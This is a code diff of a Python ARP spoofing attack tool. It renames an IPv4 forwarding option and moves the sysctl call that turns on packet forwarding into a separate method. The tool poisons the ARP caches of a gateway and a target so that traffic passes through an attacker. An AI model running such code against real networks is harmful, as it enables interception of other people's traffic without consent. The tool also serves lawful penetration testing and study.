@@ -16,37 +16,36 @@ class Spoofer(object):
                  gateway_mac: str, gateway_ip: str,
                  target_mac: str, target_ip: str,
                  interval: float, disassociate: bool,
-                 ip_forwarding: bool):
+                 ipv4_forwarding: bool):
         self.__interval = interval
-        self.__ip_forwarding = ip_forwarding
+        self.__ipv4_forwarding = ipv4_forwarding
         self.__arp = ARPSetupProxy(interface, attacker_mac, gateway_mac,
                                    gateway_ip, target_mac, target_ip,
                                    disassociate)
 
     def execute(self):
         try:
-            if self.__ip_forwarding is True:
-                self.__enable_ipv4_forwarding()
+            self.__check_ipv4_forwarding()
             self.__display_setup_prompt()
             self.__send_attack_packets()
         except KeyboardInterrupt:
             raise SystemExit('[!] ARP Spoofing attack aborted.')
 
-    @staticmethod
-    def __enable_ipv4_forwarding():
-        try:
-            """subprocess.check_call is used in preference to 'run' as 
-            an attempt to guarantee compatibility with Python 
-            interpreters with versions prior to 3.5"""
-            check_call(["sysctl", "-w", "net.ipv4.ip_forward=1"],
-                       stdout=DEVNULL, stderr=DEVNULL)
-        except CalledProcessError:
-            raise SystemExit('Error: Permission denied. Execute with '
-                             'administrator privileges.')
+    def __check_ipv4_forwarding(self):
+        if self.__ipv4_forwarding is True:
+            try:
+                """subprocess.check_call is used in preference to 'run' 
+                as an attempt to guarantee compatibility with all 
+                Python 3.x interpreters"""
+                check_call(["sysctl", "-w", "net.ipv4.ip_forward=1"],
+                           stdout=DEVNULL, stderr=DEVNULL)
+            except CalledProcessError:
+                raise SystemExit('Error: Permission denied. Execute with '
+                                 'administrative privileges.')
 
     def __display_setup_prompt(self):
         print('\n[>>>] ARP Spoofing configuration:')
-        configurations = {'IPv4 Forwarding': str(self.__ip_forwarding),
+        configurations = {'IPv4 Forwarding': str(self.__ipv4_forwarding),
                           'Interface': self.__arp.interface,
                           'Attacker MAC': self.__arp.packets.attacker_mac,
                           'Gateway IP': self.__arp.packets.gateway_ip,
@@ -120,5 +119,5 @@ if __name__ == '__main__':
                       target_ip=cli_args.targetip,
                       interval=cli_args.interval,
                       disassociate=cli_args.disassociate,
-                      ip_forwarding=cli_args.ipforward)
+                      ipv4_forwarding=cli_args.ipforward)
     spoofer.execute()
